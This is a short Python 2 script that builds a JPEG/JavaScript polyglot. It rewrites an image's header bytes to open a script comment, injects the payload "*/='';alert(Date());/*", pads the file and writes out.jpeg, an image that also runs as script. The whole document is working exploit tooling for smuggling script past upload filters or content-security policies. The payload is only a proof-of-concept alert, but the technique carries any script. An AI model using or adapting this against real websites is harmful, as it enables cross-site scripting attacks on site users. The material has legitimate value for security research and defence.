import binascii

filename = 'a.jpeg'
with open(filename, 'rb') as f:
    content = f.read()
pic_hex = binascii.hexlify(content)

# Start marker
pic_head = pic_hex[:8]

# New length + old metadata
pic_meta = "2f2a" + pic_hex[12:40]

# Picture data
pic_tail = pic_hex[40:]

# */='';alert(Date());/*
pic_payload = "2a2f3d27273b616c65727428446174652829293b2f2a"

# 2f2a = 12074
padding = (12074 * 2) - len(pic_payload) - len(pic_meta)
pic_padding = ""
for i in xrange(0, padding):
  pic_padding += "41"

pic = pic_head + pic_meta + pic_payload + pic_padding + pic_tail

output = binascii.unhexlify(pic)
filename = 'out.jpeg'
with open(filename, 'wb') as f:
    f.write(output)